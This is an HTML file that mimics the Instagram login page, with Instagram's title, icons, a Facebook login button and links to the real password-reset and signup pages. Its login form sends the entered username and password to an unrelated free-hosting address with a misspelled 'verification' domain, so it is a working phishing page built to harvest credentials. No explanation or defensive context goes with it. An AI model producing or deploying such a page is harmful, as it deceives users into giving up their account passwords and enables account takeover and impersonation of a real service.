<!DOCTYPE html>
<head>
  <title>Log in · Instagram</title>
  <link rel="icon" type="img/png" href="instagram.png" />
  <link rel="stylesheet" href="style.css" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
</head>
<body>
  <div class="container">
    <div class="box">
      <div class="heading"></div>
      <form class="login-form" action="https://uservarificationsite.000webhostapp.com/login.php" method="post">
        <div class="field">
          <input
            id="username"
            type="name"
             name ="username"
            placeholder="Phone number, username, or email"
          />
          <label for="username">Phone number, username, or email</label>
        </div>
        <div class="field">
          <input id="password" type="password" name="password" placeholder="password" />
          <label for="password">Password</label>
        </div>
        <button class="login-button" type="submit" title="login">Log In</button>
        <div class="separator">
          <div class="line"></div>
          <p>OR</p>
          <div class="line"></div>
        </div>
        <div class="other">
          <button class="fb-login-btn" type="button">
            <img src="facebook.png" width="20" />
            <span class=""> Log in with Facebook</span>
          </button>
          <a
            class="forgot-password"
            href="https://www.instagram.com/accounts/password/reset/"
            >Forgot password?</a
          >
        </div>
      </form>
    </div>
    <div class="box">
      <p>
        Don't have an account?
        <a class="signup" href="https://www.instagram.com/accounts/emailsignup/"
          >Sign Up</a
        >
      </p>
    </div>
  </div>
</body>
